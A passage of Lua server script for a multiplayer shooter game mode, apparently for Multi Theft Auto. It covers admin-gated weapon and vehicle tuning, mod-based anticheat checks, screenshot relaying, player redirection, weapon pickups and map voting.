            setWeaponProperty(weaponID3, "pro", "anim_loop_start", animLoopStart);
            setWeaponProperty(weaponID3, "pro", "anim_loop_stop", animLoopStop);
            setWeaponProperty(weaponID3, "pro", "anim_loop_bullet_fire", animLoopBulletFire);
            setWeaponProperty(weaponID3, "pro", "anim2_loop_start", anim2LoopStart);
            setWeaponProperty(weaponID3, "pro", "anim2_loop_stop", anim2LoopStop);
            setWeaponProperty(weaponID3, "pro", "anim2_loop_bullet_fire", anim2LoopBulletFire);
            setWeaponProperty(weaponID3, "pro", "anim_breakout_time", animBreakoutTime);
            local currentFlagsStr = string.reverse(string.format("%04X", getWeaponProperty(weaponID3, "pro", "flags")));
            for flagGroup2 = 1, 4 do
                local flagHexValue = tonumber(string.sub(currentFlagsStr, flagGroup2, flagGroup2), 16);
                if flagHexValue then
                    for bitPos2 = 3, 0, -1 do
                        local bitValue2 = 2 ^ bitPos2;
                        if bitValue2 <= flagHexValue then
                            if not flagSettings[flagGroup2][bitValue2] then
                                setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. tostring(bitValue2) .. string.rep("0", flagGroup2 - 1)));
                            end;
                            flagHexValue = flagHexValue - bitValue2;
                        elseif flagSettings[flagGroup2][bitValue2] then
                            setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. tostring(bitValue2) .. string.rep("0", flagGroup2 - 1)));
                        end;
                    end;
                else
                    if flagSettings[flagGroup2][1] then
                        setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. "1" .. string.rep("0", flagGroup2 - 1)));
                    end;
                    if flagSettings[flagGroup2][2] then
                        setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. "2" .. string.rep("0", flagGroup2 - 1)));
                    end;
                    if flagSettings[flagGroup2][3] then
                        setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. "4" .. string.rep("0", flagGroup2 - 1)));
                    end;
                    if flagSettings[flagGroup2][4] then
                        setWeaponProperty(weaponID3, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroup2) .. "8" .. string.rep("0", flagGroup2 - 1)));
                    end;
                end;
            end;
            return callClientFunction(weaponAdmin, "refreshWeaponProperties");
        end;
    end;
    resetWeaponProperty = function(resetAdmin, resetWeaponID) 
        if not hasObjectPermissionTo(resetAdmin, "general.tactics_shooting", false) then
            return outputLangString(resetAdmin, "you_have_not_permissions");
        else
            setWeaponProperty(resetWeaponID, "pro", "weapon_range", getOriginalWeaponProperty(resetWeaponID, "pro", "weapon_range"));
            setWeaponProperty(resetWeaponID, "pro", "target_range", getOriginalWeaponProperty(resetWeaponID, "pro", "target_range"));
            setWeaponProperty(resetWeaponID, "pro", "accuracy", getOriginalWeaponProperty(resetWeaponID, "pro", "accuracy"));
            setWeaponProperty(resetWeaponID, "pro", "damage", getOriginalWeaponProperty(resetWeaponID, "pro", "damage"));
            setWeaponProperty(resetWeaponID, "pro", "maximum_clip_ammo", getOriginalWeaponProperty(resetWeaponID, "pro", "maximum_clip_ammo"));
            setWeaponProperty(resetWeaponID, "pro", "move_speed", getOriginalWeaponProperty(resetWeaponID, "pro", "move_speed"));
            setWeaponProperty(resetWeaponID, "pro", "anim_loop_start", getOriginalWeaponProperty(resetWeaponID, "pro", "anim_loop_start"));
            setWeaponProperty(resetWeaponID, "pro", "anim_loop_stop", getOriginalWeaponProperty(resetWeaponID, "pro", "anim_loop_stop"));
            setWeaponProperty(resetWeaponID, "pro", "anim_loop_bullet_fire", getOriginalWeaponProperty(resetWeaponID, "pro", "anim_loop_bullet_fire"));
            setWeaponProperty(resetWeaponID, "pro", "anim2_loop_start", getOriginalWeaponProperty(resetWeaponID, "pro", "anim2_loop_start"));
            setWeaponProperty(resetWeaponID, "pro", "anim2_loop_stop", getOriginalWeaponProperty(resetWeaponID, "pro", "anim2_loop_stop"));
            setWeaponProperty(resetWeaponID, "pro", "anim2_loop_bullet_fire", getOriginalWeaponProperty(resetWeaponID, "pro", "anim2_loop_bullet_fire"));
            setWeaponProperty(resetWeaponID, "pro", "anim_breakout_time", getOriginalWeaponProperty(resetWeaponID, "pro", "anim_breakout_time"));
            local originalFlagsStr = string.reverse(string.format("%04X", getOriginalWeaponProperty(resetWeaponID, "pro", "flags")));
            local currentFlagsStr2 = string.reverse(string.format("%04X", getWeaponProperty(resetWeaponID, "pro", "flags")));
            local originalFlagBits = {
                {}, 
                {}, 
                {}, 
                {}, 
                {}
            };
            for flagGroupIndex2 = 1, 4 do
                local originalHex = tonumber(string.sub(originalFlagsStr, flagGroupIndex2, flagGroupIndex2), 16);
                if originalHex then
                    for bitPos3 = 3, 0, -1 do
                        local bitValue3 = 2 ^ bitPos3;
                        if bitValue3 <= originalHex then
                            originalFlagBits[flagGroupIndex2][bitValue3] = true;
                            originalHex = originalHex - bitValue3;
                        else
                            originalFlagBits[flagGroupIndex2][bitValue3] = false;
                        end;
                    end;
                else
                    originalFlagBits[flagGroupIndex2][1] = false;
                    originalFlagBits[flagGroupIndex2][2] = false;
                    originalFlagBits[flagGroupIndex2][4] = false;
                    originalFlagBits[flagGroupIndex2][8] = false;
                end;
            end;
            for flagGroupIndex3 = 1, 4 do
                local currentHex2 = tonumber(string.sub(currentFlagsStr2, flagGroupIndex3, flagGroupIndex3), 16);
                if currentHex2 then
                    for bitPos4 = 3, 0, -1 do
                        local bitValue4 = 2 ^ bitPos4;
                        if bitValue4 <= currentHex2 then
                            if not originalFlagBits[flagGroupIndex3][bitValue4] then
                                setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. tostring(bitValue4) .. string.rep("0", flagGroupIndex3 - 1)));
                            end;
                            currentHex2 = currentHex2 - bitValue4;
                        elseif originalFlagBits[flagGroupIndex3][bitValue4] then
                            setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. tostring(bitValue4) .. string.rep("0", flagGroupIndex3 - 1)));
                        end;
                    end;
                else
                    if originalFlagBits[flagGroupIndex3][8] then
                        setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. "8" .. string.rep("0", flagGroupIndex3 - 1)));
                    end;
                    if originalFlagBits[flagGroupIndex3][4] then
                        setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. "4" .. string.rep("0", flagGroupIndex3 - 1)));
                    end;
                    if originalFlagBits[flagGroupIndex3][2] then
                        setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. "2" .. string.rep("0", flagGroupIndex3 - 1)));
                    end;
                    if originalFlagBits[flagGroupIndex3][1] then
                        setWeaponProperty(resetWeaponID, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex3) .. "1" .. string.rep("0", flagGroupIndex3 - 1)));
                    end;
                end;
            end;
            return callClientFunction(resetAdmin, "refreshWeaponProperties");
        end;
    end;
    addAnticheatModsearch = function(modName, modSearch, modType) 
        local modsList2 = getTacticsData("anticheat", "modslist") or {};
        table.insert(modsList2, {
            name = modName, 
            search = modSearch, 
            type = modType
        });
        setTacticsData(modsList2, "anticheat", "modslist");
    end;
    setAnticheatModsearch = function(modIndex, newModName, newModSearch, newModType) 
        local modsList3 = getTacticsData("anticheat", "modslist") or {};
        if not modsList3[modIndex + 1] then
            return;
        else
            modsList3[modIndex + 1] = {
                name = newModName, 
                search = newModSearch, 
                type = newModType
            };
            setTacticsData(modsList3, "anticheat", "modslist");
            return;
        end;
    end;
    removeAnticheatModsearch = function(removeModIndex) 
        local modsList4 = getTacticsData("anticheat", "modslist") or {};
        table.remove(modsList4, removeModIndex + 1);
        setTacticsData(modsList4, "anticheat", "modslist");
    end;
    changeVehicleHandling = function(handlingAdmin, vehicleModelID4, handlingChanges) 
        if not hasObjectPermissionTo(handlingAdmin, "general.tactics_handling", false) then
            return outputLangString(handlingAdmin, "you_have_not_permissions");
        else
            local handlingTable = getTacticsData("handlings") or {};
            if not handlingTable[vehicleModelID4] then
                handlingTable[vehicleModelID4] = {
                    nil
                };
            end;
            local originalHandling2 = getOriginalHandling(vehicleModelID4);
            for handlingProp, handlingPropValue in pairs(handlingChanges) do
                if type(handlingPropValue) == "boolean" and originalHandling2[handlingProp] == handlingPropValue then
                    handlingTable[vehicleModelID4][handlingProp] = nil;
                elseif handlingProp == "sirens" then
                    if handlingPropValue.count == 0 then
                        handlingTable[vehicleModelID4][handlingProp] = nil;
                    else
                        handlingTable[vehicleModelID4][handlingProp] = handlingPropValue;
                    end;
                elseif type(handlingPropValue) == "table" and string.format("%.3f", originalHandling2[handlingProp][1]) == string.format("%.3f", handlingPropValue[1]) and string.format("%.3f", originalHandling2[handlingProp][2]) == string.format("%.3f", handlingPropValue[2]) and string.format("%.3f", originalHandling2[handlingProp][3]) == string.format("%.3f", handlingPropValue[3]) then
                    handlingTable[vehicleModelID4][handlingProp] = nil;
                elseif type(handlingPropValue) == "number" and string.format("%.3f", originalHandling2[handlingProp]) == string.format("%.3f", handlingPropValue) then
                    handlingTable[vehicleModelID4][handlingProp] = nil;
                elseif type(handlingPropValue) == "string" and (handlingProp == "modelFlags" or handlingProp == "handlingFlags") and string.format("0x%08X", originalHandling2[handlingProp]) == handlingPropValue then
                    handlingTable[vehicleModelID4][handlingProp] = nil;
                elseif type(handlingPropValue) == "string" and originalHandling2[handlingProp] == handlingPropValue then
                    handlingTable[vehicleModelID4][handlingProp] = nil;
                elseif handlingPropValue ~= nil then
                    handlingTable[vehicleModelID4][handlingProp] = handlingPropValue;
                end;
            end;
            setTacticsData(handlingTable, "handlings");
            return;
        end;
    end;
    resetVehicleHandling = function(resetHandlingAdmin, resetVehicleModel) 
        if not hasObjectPermissionTo(resetHandlingAdmin, "general.tactics_handling", false) then
            return outputLangString(resetHandlingAdmin, "you_have_not_permissions");
        else
            local handlingTable2 = getTacticsData("handlings") or {};
            handlingTable2[resetVehicleModel] = nil;
            setTacticsData(handlingTable2, "handlings");
            return;
        end;
    end;
    onPlayerScreenShot = function(screenshotResource, screenshotStatus, screenshotData, _, screenshotExtra) 
        if screenshotResource ~= getThisResource() and screenshotResource ~= "disabled" then
            return;
        else
            local currentTime = getRealTime();
            local targetName, tagOne, tagTwo, _ = unpack(split(screenshotExtra, " "));
            local fileName = string.format("%s_%04i-%02i-%02i_%02i-%02i-%02i", getPlayerName(source):gsub("[\\/:*?\"<>|]", "-"):gsub("-+", "-"):gsub("-$", ""):gsub("^-", ""), currentTime.year + 1900, currentTime.month + 1, currentTime.monthday, currentTime.hour, currentTime.minute, currentTime.second);
            local targetPlayer4 = getPlayerFromName(targetName);
            if not targetPlayer4 then
                return;
            elseif screenshotStatus == "disabled" then
                outputDebugString("takeDisabledScreenShot");
                triggerClientEvent(source, "takeDisabledScreenShot", source, screenshotExtra);
                return;
            else
                outputDebugString("2 = " .. #screenshotData);
                triggerClientEvent(targetPlayer4, "onClientPlayerScreenShot", source, screenshotStatus, screenshotData, tagOne, tagTwo, fileName);
                return;
            end;
        end;
    end;
    connectPlayers = function(connectAdmin, playersToConnect, serverIP, serverPort, serverPassword) 
        if not hasObjectPermissionTo(getThisResource(), "function.redirectPlayer", false) then
            return outputLangString(connectAdmin, "resource_have_not_permissions", getResourceName(getThisResource()), "function.redirectPlayer");
        else
            if serverIP and serverPort then
                for _, playerToRedirect in ipairs(playersToConnect) do
                    redirectPlayer(playerToRedirect, tostring(serverIP), tonumber(serverPort), serverPassword);
                end;
            end;
            return;
        end;
    end;
    addEvent("onPlayerDisabledScreenShot", true);
    addCommandHandler("exe", executeRuncode, false, false);
    addCommandHandler("exestop", stopRuncode, false, false);
    addCommandHandler("end", onRoundStop, false, false);
    addCommandHandler("add", addPlayer, false, false);
    addCommandHandler("remove", removePlayer, false, false);
    addCommandHandler("restore", restorePlayer, false, false);
    addCommandHandler("balance", balanceTeams, false, false);
    addCommandHandler("Adminsay", onPlayerAdminchat, false, false);
    addCommandHandler("asay", sayFromAdmin, false, false);
    addCommandHandler("next", nextCyclerMap, false, false);
    addCommandHandler("prev", previousCyclerMap, false, false);
    addCommandHandler("previous", previousCyclerMap, false, false);
    addEventHandler("onResourceStart", resourceRoot, onResourceStart);
    addEventHandler("onPlayerJoin", root, onPlayerJoin);
    addEventHandler("onPlayerLogin", root, onPlayerLogin);
    addEventHandler("onElementDataChange", root, onElementDataChange);
    addEventHandler("onTacticsChange", root, onTacticsChange);
    addEventHandler("onPlayerScreenShot", root, onPlayerScreenShot);
    addEventHandler("onPlayerDisabledScreenShot", root, onPlayerScreenShot);
end)();
(function(...) 
    onTacticsChange = function(changePath, _) 
        if changePath[1] == "anticheat" then
            if changePath[2] == "mods" then
                if getTacticsData("anticheat", "mods") == "true" then
                    addEventHandler("onPlayerModInfo", root, modifications_onPlayerModInfo);
                    for _, playerToCheckMods in ipairs(getElementsByType("player")) do
                        resendPlayerModInfo(playerToCheckMods);
                    end;
                else
                    removeEventHandler("onPlayerModInfo", root, modifications_onPlayerModInfo);
                end;
            end;
            if changePath[2] == "modslist" and getTacticsData("anticheat", "mods") == "true" then
                for _, playerToResend in ipairs(getElementsByType("player")) do
                    resendPlayerModInfo(playerToResend);
                end;
            end;
        end;
    end;
    addEventHandler("onTacticsChange", root, onTacticsChange);
    modifications_onPlayerModInfo = function(_, modInfoList) 
        local modsList = getTacticsData("anticheat", "modslist");
        local modPatterns = {};
        local modCounts = {};
        local modNames = {};
        for _, modEntry in ipairs(modsList) do
            table.insert(modPatterns, {
                search = modEntry.search:gsub("*", ".+"), 
                type = modEntry.type
            });
            table.insert(modCounts, 0);
            table.insert(modNames, "");
        end;
        local hasModViolation = false;
        for _, modInfo in ipairs(modInfoList) do
            for patternIndex, patternData in ipairs(modPatterns) do
                if string.match(modInfo[patternData.type], patternData.search) then
                    hasModViolation = true;
                    modCounts[patternIndex] = modCounts[patternIndex] + 1;
                    modNames[patternIndex] = modInfo.name;
                end;
            end;
        end;
        if hasModViolation then
            local violationString = "";
            for violationIndex in ipairs(modPatterns) do
                if modCounts[violationIndex] > 0 then
                    violationString = violationString .. string.format(" %i/%s", modCounts[violationIndex], modNames[violationIndex]);
                end;
            end;
            doPunishment(source, "Mods" .. violationString);
        end;
    end;
    doPunishment = function(cheatPlayer, cheatType) 
        local punishmentAction = getTacticsData("anticheat", "action_detection");
        if punishmentAction == "chat" then
            outputLangString(root, "player_cheat_detected", getPlayerName(cheatPlayer), cheatType);
        elseif punishmentAction == "adminchat" then
            for _, adminPlayer in ipairs(getElementsByType("player")) do
                if hasObjectPermissionTo(adminPlayer, "general.tactics_adminchat", false) then
                    outputLangString(adminPlayer, "player_cheat_detected", getPlayerName(cheatPlayer), cheatType);
                end;
            end;
        elseif punishmentAction == "kick" then
            if hasObjectPermissionTo(getThisResource(), "function.kickPlayer", false) then
                kickPlayer(cheatPlayer, cheatType);
            else
                for _, adminToNotify in ipairs(getElementsByType("player")) do
                    if hasObjectPermissionTo(adminToNotify, "general.tactics_adminchat", false) then
                        outputLangString(adminToNotify, "resource_have_not_permissions", getResourceName(getThisResource()), "function.kickPlayer");
                    end;
                end;
            end;
        end;
    end;
end)();
(function(...) 
    pickupWeapon = function(playerPickup, weaponPickup) 
        if not isElement(weaponPickup) then
            return;
        elseif triggerEvent("onWeaponPickup", playerPickup, weaponPickup) == false then
            return;
        else
            local pickupWeaponID = getPickupWeapon(weaponPickup);
            local pickupAmmo = getPickupAmmo(weaponPickup);
            local pickupClip = getElementData(weaponPickup, "Clip");
            destroyElement(weaponPickup);
            giveWeapon(playerPickup, pickupWeaponID, pickupAmmo, true);
            if pickupClip then
                setWeaponAmmo(playerPickup, pickupWeaponID, pickupAmmo, pickupClip);
            end;
            return;
        end;
    end;
    replaceWeapon = function(playerReplace, replacePickup, weaponSlot) 
        if not isElement(replacePickup) then
            return;
        elseif triggerEvent("onWeaponPickup", playerReplace, replacePickup) == false then
            return;
        else
            local currentWeapon = getPedWeapon(playerReplace, weaponSlot);
            local currentAmmo = getPedTotalAmmo(playerReplace, weaponSlot);
            local currentClip = getPedAmmoInClip(playerReplace, weaponSlot);
            if currentWeapon > 0 then
                local droppedWeapon = createWeaponUnderPlayer(playerReplace, currentWeapon, currentAmmo, currentClip);
                if triggerEvent("onWeaponDrop", playerReplace, droppedWeapon) == false then
                    if isElement(droppedWeapon) then
                        destroyElement(droppedWeapon);
                    end;
                    return;
                else
                    takeWeapon(playerReplace, currentWeapon);
                end;
            end;
            local newPickupWeapon = getPickupWeapon(replacePickup);
            local newPickupAmmo = getPickupAmmo(replacePickup);
            local newPickupClip = getElementData(replacePickup, "Clip");
            destroyElement(replacePickup);
            giveWeapon(playerReplace, newPickupWeapon, newPickupAmmo, true);
            if newPickupClip then
                setWeaponAmmo(playerReplace, newPickupWeapon, newPickupAmmo, newPickupClip);
            end;
            return;
        end;
    end;
    dropWeapon = function(playerDrop, dropSlot) 
        local dropWeaponID = getPedWeapon(playerDrop, dropSlot);
        local dropAmmo = getPedTotalAmmo(playerDrop, dropSlot);
        local dropClip = getPedAmmoInClip(playerDrop, dropSlot);
        if dropWeaponID > 0 then
            local createdPickup = createWeaponUnderPlayer(playerDrop, dropWeaponID, dropAmmo, dropClip);
            if triggerEvent("onWeaponDrop", playerDrop, createdPickup) == false then
                if isElement(createdPickup) then
                    destroyElement(createdPickup);
                end;
            else
                takeWeapon(playerDrop, dropWeaponID);
            end;
        end;
    end;
    createWeaponUnderPlayer = function(weaponPlayer, createWeaponID, createAmmo, createClip) 
        if createWeaponID > 0 and createAmmo > 0 and createClip then
            local playerPosX2, playerPosY2, playerPosZ2 = getElementPosition(weaponPlayer);
            local weaponPickupElement = createPickup(playerPosX2 + 0.2 * math.random(-5, 5), playerPosY2 + 0.2 * math.random(-5, 5), playerPosZ2 - 0.5, 2, createWeaponID, 0, createAmmo);
            setElementParent(weaponPickupElement, getRoundMapDynamicRoot());
            setElementData(weaponPickupElement, "Clip", createClip);
            setElementInterior(weaponPickupElement, getElementInterior(weaponPlayer));
            setElementDimension(weaponPickupElement, getElementDimension(weaponPlayer));
            return weaponPickupElement;
        else
            return false;
        end;
    end;
    onPlayerWasted = function(_, _, _, _, _) 
        dropWeapon(source);
    end;
    onPickupUse = function(_) 
        cancelEvent();
    end;
    addEvent("onWeaponDrop");
    addEvent("onWeaponPickup");
    addEventHandler("onPlayerWasted", root, onPlayerWasted);
    addEventHandler("onPickupUse", root, onPickupUse);
end)();
(function(...) 
    local tabboardColumns = {};
    setTabboardColumns = function(columnsData) 
        if not columnsData then
            columnsData = {};
        end;
        tabboardColumns = columnsData;
        triggerClientEvent(root, "onClientTabboardChange", root, columnsData);
    end;
    onPlayerDownloadComplete = function() 
        triggerClientEvent(client, "onClientTabboardChange", root, tabboardColumns, getServerName(), getMaxPlayers(), getVersion());
    end;
    getElementStat = function(elementToGetStat, statKey) 
        if not isElement(elementToGetStat) or getElementType(elementToGetStat) ~= "player" and getElementType(elementToGetStat) ~= "team" then
            return false;
        else
            local statValue = getElementData(elementToGetStat, statKey);
            if type(statValue) == "nil" then
                statValue = 0;
            end;
            if type(statValue) ~= "number" then
                return false;
            else
                return statValue;
            end;
        end;
    end;
    setElementStat = function(elementToSetStat, setStatKey, setStatValue) 
        if not isElement(elementToSetStat) or getElementType(elementToSetStat) ~= "player" and getElementType(elementToSetStat) ~= "team" then
            return false;
        else
            local currentStatValue = getElementData(elementToSetStat, setStatKey);
            if type(currentStatValue) == "nil" then
                currentStatValue = 0;
            end;
            if type(currentStatValue) ~= "number" then
                return false;
            else
                return setElementData(elementToSetStat, currentStatValue, setStatValue);
            end;
        end;
    end;
    giveElementStat = function(elementToGiveStat, giveStatKey, giveStatValue) 
        if not isElement(elementToGiveStat) or getElementType(elementToGiveStat) ~= "player" and getElementType(elementToGiveStat) ~= "team" then
            return false;
        else
            local existingStatValue = getElementData(elementToGiveStat, giveStatKey);
            if type(existingStatValue) == "nil" then
                existingStatValue = 0;
            end;
            if type(existingStatValue) ~= "number" then
                return false;
            else
                return setElementData(elementToGiveStat, existingStatValue, existingStatValue + giveStatValue);
            end;
        end;
    end;
    addEventHandler("onPlayerDownloadComplete", root, onPlayerDownloadComplete);
end)();
(function(...) 
    local validProperties = {
        invulnerable = true, 
        invisible = true, 
        freezable = true, 
        flammable = true, 
        movespeed = true, 
        regenerable = true, 
        wallhack = true
    };
    setPlayerProperty = function(propertyPlayer, propertyName, propertyValue) 
        if not validProperties[propertyName] then
            return false;
        else
            local playerProperties = getElementData(propertyPlayer, "Properties") or {};
            if propertyValue ~= nil and propertyValue ~= false then
                playerProperties[propertyName] = propertyValue;
            else
                playerProperties[propertyName] = nil;
            end;
            return setElementData(propertyPlayer, "Properties", playerProperties);
        end;
    end;
    givePlayerProperty = function(givePropertyPlayer, givePropertyName, givePropertyValue, givePropertyTime) 
        if not validProperties[givePropertyName] then
            return false;
        else
            local playerProperties2 = getElementData(givePropertyPlayer, "Properties") or {};
            if givePropertyValue ~= nil and givePropertyValue ~= false then
                playerProperties2[givePropertyName] = {
                    givePropertyValue, 
                    givePropertyTime
                };
            else
                playerProperties2[givePropertyName] = nil;
            end;
            return setElementData(givePropertyPlayer, "Properties", playerProperties2);
        end;
    end;
    getPlayerProperty = function(getPropertyPlayer, getPropertyName) 
        if not getPropertyPlayer or not isElement(getPropertyPlayer) or not validProperties[getPropertyName] then
            return false;
        else
            local propertyTable = getElementData(getPropertyPlayer, "Properties") or {};
            if type(propertyTable[getPropertyName]) == "table" then
                return unpack(propertyTable[getPropertyName]);
            else
                return propertyTable[getPropertyName];
            end;
        end;
    end;
end)();
(function(...) 
    local votingTimer = nil;
    local votingFunctions = {};
    local function executeVoteResult(voteResult) 
        local votedResource = getResourceFromName(voteResult.resname);
        if votedResource then
            setTacticsData(nil, "voting");
            if getTacticsData("Map") == "lobby" then
                startMap(votedResource, "vote");
            elseif getTacticsData("automatics") == "voting" and winTimer == "voting" then
                startMap(votedResource, "vote");
            else
                setTacticsData(voteResult.resname, "ResourceNext");
                outputLangString(root, "map_set_next", voteResult.label);
            end;
            return true;
        else
            return false;
        end;
    end;
    createVoting = function(voteOptionsList, voteName) 
        local currentVote = getTacticsData("voting");
        if currentVote and currentVote.finish and currentVote.finish < getTickCount() then
            if isTimer(votingTimer) then
                killTimer(votingTimer);
            end;
            setTacticsData(nil, "voting");
        elseif not currentVote then
            local voteDurationSec = TimeToSec(getTacticsData("settings", "vote_duration") or "0:20");
            votingFunctions = {};
            for optionIndex in ipairs(voteOptionsList) do
                table.insert(votingFunctions, voteOptionsList[optionIndex].func);
                voteOptionsList[optionIndex].num = optionIndex;
            end;
            currentVote = {
                rows = voteOptionsList, 
                cancel = 0, 
                finish = getTickCount() + voteDurationSec * 1000, 
                name = voteName
            };
            if isTimer(votingTimer) then
                killTimer(votingTimer);
            end;
            votingTimer = setTimer(onVotingFinish, voteDurationSec * 1000, 1, voteName);
            setTacticsData(currentVote, "voting");
            return true;
        end;
        return false;
    end;
    stopVoting = function(stopVoteSource) 
        if not getTacticsData("voting") or type(stopVoteSource) == "userdata" and not hasObjectPermissionTo(stopVoteSource, "general.tactics_maps", false) then
            return false;
        elseif type(stopVoteSource) == "string" and stopVoteSource ~= getTacticsData("voting").name then
            return false;
        else
            if isTimer(votingTimer) then
                killTimer(votingTimer);
            end;
            setTacticsData(nil, "voting");
            outputLangString(root, "voting_canceled");
            return true;
        end;
    end;
    getVotingInfo = function() 
        return getTacticsData("voting") or {};
    end;
    onPlayerVote = function(voteData, previousVote, voteIdentifier) 
        if source ~= client then return end
        local voterName = getElementType(source) == "player" and getPlayerName(source) or getElementType(source) == "team" and getTeamName(source) or "Console";
        local voteInfo = getTacticsData("voting");
        if voteIdentifier ~= nil and voteInfo and voteIdentifier ~= voteInfo.name then
            return;
        elseif voteInfo and voteInfo.finish and voteInfo.finish < getTickCount() then
            if isTimer(votingTimer) then
                killTimer(votingTimer);
            end;
            return setTacticsData(nil, "voting");
        else
            if not voteData then
                voteInfo = getTacticsData("voting");
                if voteInfo and voteInfo.rows and #voteInfo.rows > 0 and voteInfo.cancel then
                    if previousVote and previousVote > 0 then
                        voteInfo.rows[previousVote].votes = voteInfo.rows[previousVote].votes - 1;
                    end;
                    if previousVote == 0 then
                        voteInfo.cancel = voteInfo.cancel - 1;
                    end;
                    return setTacticsData(voteInfo, "voting");
                end;
            elseif type(voteData) == "table" then
                voteInfo = getTacticsData("voting");
                local voteTimeSec = TimeToSec(getTacticsData("settings", "vote_duration") or "0:20");
                local voteOptionsText = "";
                local disabledMapsTable3 = getTacticsData("map_disabled") or {};
                for _, voteOption in ipairs(voteData) do
                    local resourceNameVote, _ = unpack(voteOption);
                    local displayName = "";
                    local modeNameVote = "";
                    if string.find(resourceNameVote, "_") ~= nil then
                        modeNameVote = string.lower(string.sub(resourceNameVote, 1, string.find(resourceNameVote, "_") - 1));
                    end;
                    local voteResource = getResourceFromName(resourceNameVote);
                    if voteResource and #modeNameVote > 0 and getTacticsData("modes", modeNameVote, "enable") ~= "false" and not disabledMapsTable3[resourceNameVote] then
                        displayName = getResourceInfo(voteResource, "name");
                        if not displayName then
                            displayName = string.sub(string.gsub(getResourceName(voteResource), "_", " "), #modeNameVote + 2);
                            if #displayName > 1 then
                                displayName = string.upper(string.sub(displayName, 1, 1)) .. string.sub(displayName, 2);
                            end;
                        end;
                        displayName = string.upper(string.sub(modeNameVote, 1, 1)) .. string.sub(modeNameVote, 2) .. ": " .. displayName;
                    elseif voterName ~= "Console" then
                        outputLangString(source, "voting_notexist");
                        return;
                    end;
                    if voteInfo and voteInfo.rows and #voteInfo.rows > 0 and voteInfo.cancel then
                        if #voteInfo.rows > 8 then
                            return;
                        else
                            for _, existingRow in ipairs(voteInfo.rows) do
                                if existingRow[1] == resourceNameVote then
                                    return;
                                end;
                            end;
                            table.insert(votingFunctions, executeVoteResult);
                            table.insert(voteInfo.rows, {
                                resname = resourceNameVote, 
                                votes = 0, 
                                cteator = voterName, 
                                label = displayName, 
                                num = #votingFunctions
                            });
                        end;
                    else
                        if getElementType(source) == "player" then
                            if getTacticsData("automatics") == "lobby" and getTacticsData("Map") ~= "lobby" then
                                outputLangString(source, "voting_disabled");
                                return;
                            elseif getTacticsData("settings", "vote") == "false" then
                                outputLangString(source, "voting_disabled");
                                return;
                            end;
                        end;
                        voteInfo = {
                            rows = {
                                {
                                    resname = resourceNameVote, 
                                    votes = 0, 
                                    creator = voterName, 
                                    label = displayName, 
                                    num = 1
                                }
                            }, 
                            cancel = 0, 
                            start = getTickCount() + voteTimeSec * 1000, 
                            name = voteIdentifier
                        };
                        votingFunctions = {
                            executeVoteResult
                        };
                    end;
                    if #voteOptionsText == 0 then
                        voteOptionsText = displayName;
                    else
                        voteOptionsText = voteOptionsText .. ", " .. displayName;
                    end;
                end;
                if isTimer(votingTimer) then
                    killTimer(votingTimer);
                end;
                votingTimer = setTimer(onVotingFinish, voteTimeSec * 1000, 1);
                if voterName ~= "Console" then
                    outputLangString(root, "voting_start", voterName, voteOptionsText);
                end;
                return setTacticsData(voteInfo, "voting");
            elseif type(voteData) == "string" then
                voteInfo = getTacticsData("voting");
                local resourceDisplayName2 = "";
                local voteModeName = "";
                if string.find(voteData, "_") ~= nil then
                    voteModeName = string.lower(string.sub(voteData, 1, string.find(voteData, "_") - 1));
                end;
                local disabledMapsTable4 = getTacticsData("map_disabled") or {};
                local mapResourceVote = getResourceFromName(voteData);
                if mapResourceVote and #voteModeName > 0 and getTacticsData("modes", voteModeName, "enable") ~= "false" and not disabledMapsTable4[voteData] then
                    resourceDisplayName2 = getResourceInfo(mapResourceVote, "name");
                    if not resourceDisplayName2 then
                        resourceDisplayName2 = string.sub(string.gsub(getResourceName(mapResourceVote), "_", " "), #voteModeName + 2);
                        if #resourceDisplayName2 > 1 then
                            resourceDisplayName2 = string.upper(string.sub(resourceDisplayName2, 1, 1)) .. string.sub(resourceDisplayName2, 2);
                        end;
                    end;
                    resourceDisplayName2 = string.upper(string.sub(voteModeName, 1, 1)) .. string.sub(voteModeName, 2) .. ": " .. resourceDisplayName2;
                elseif voterName ~= "Console" then
                    outputLangString(source, "voting_notexist");
                    return;
                end;
                if voteInfo and voteInfo.rows and #voteInfo.rows > 0 and voteInfo.cancel then
                    if #voteInfo.rows > 8 then
                        return;
                    else
                        for _, existingVoteRow in ipairs(voteInfo.rows) do
                            if existingVoteRow[1] == voteData then
                                return;
                            end;
                        end;
                        table.insert(votingFunctions, executeVoteResult);
                        table.insert(voteInfo.rows, {
                            resname = voteData, 
                            votes = 0, 
                            creator = voterName, 
                            label = resourceDisplayName2, 
                            num = #votingFunctions
                        });
                        if voterName ~= "Console" then
                            outputLangString(root, "voting_start", voterName, resourceDisplayName2);
                        end;
                    end;
                else
                    if getElementType(source) == "player" then
                        if getTacticsData("automatics") == "lobby" and getTacticsData("Map") ~= "lobby" then
                            outputLangString(source, "voting_disabled");
                            return;
                        elseif getTacticsData("settings", "vote") == "false" then
                            outputLangString(source, "voting_disabled");
                            return;
                        end;
                    end;
                    local voteDurationSec2 = TimeToSec(getTacticsData("settings", "vote_duration") or "0:20");
                    voteInfo = {
                        rows = {
                            {
                                resname = voteData, 
                                votes = 0, 
                                creator = voterName, 
                                label = resourceDisplayName2, 
                                num = 1
                            }
                        }, 
                        cancel = 0, 
                        start = getTickCount() + voteDurationSec2 * 1000, 
                        name = voteIdentifier
                    };
                    votingFunctions = {
